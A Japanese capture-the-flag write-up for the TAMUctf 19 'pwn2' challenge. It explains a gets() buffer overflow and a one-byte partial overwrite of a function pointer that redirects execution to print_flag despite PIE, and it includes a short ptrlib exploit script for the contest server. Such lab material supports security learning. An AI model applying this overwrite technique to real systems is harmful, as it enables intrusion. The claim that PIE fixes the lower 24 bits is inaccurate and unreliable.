# [pwn 356pts] pwn2 - TAMUctf 19
32ビットでPIE有効、Full RELROです。
```
$ checksec pwn2
[*] 'pwn2'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Full RELRO
    PIE:        PIE enabled
```
文字列を入力して`one`なら`one`関数が、それ以外なら`two`関数が呼ばれます。
なお、これが呼ばれる`select_func`関数では`main`関数で入力した文字列をstrcpyでコピーします。
また、使われていない`print_flag`関数が存在します。

文字列の入力にはgetsが使われているのでバッファオーバーフローが存在します。
また、`select_func`関数にはジャンプする関数のアドレスを入れておく変数が存在します。
したがって、オーバーフローでこのアドレスを`print_flag`のものに書き換えればよさそうです。

さて、一見PIEが有効で困っているようですが、関数`two`のアドレスは0x6ad、`print_flag`のアドレスは0x6d8です。
また、PIEは実行ファイルをランダムなアドレスに配置しますが、そのアドレスは0x?????000のように下位24bitは0で固定です。
例えば`two`のアドレスが0x5678a6adだったとき、`printf_flag`は0x5678a6d8`に存在します。
したがって、`two`のアドレスが入った変数の下位1バイトを0xd8に上書きしてやれば`print_flag`を呼ぶことができます。

```python
from ptrlib import *

sock = Socket("pwn.tamuctf.com", 4322)

payload = b'A' * 0x1E
payload += b'\xd8'
sock.recvline()
sock.sendline(payload)
sock.interactive()
```

# 感想
シンプルなバッファオーバーフローの問題です。
オーバーフローをどのように利用するかという点で、pwn入門者が脆弱性を見つける練習になると思います。
ただPIEの挙動を理解しておく必要があるので注意です。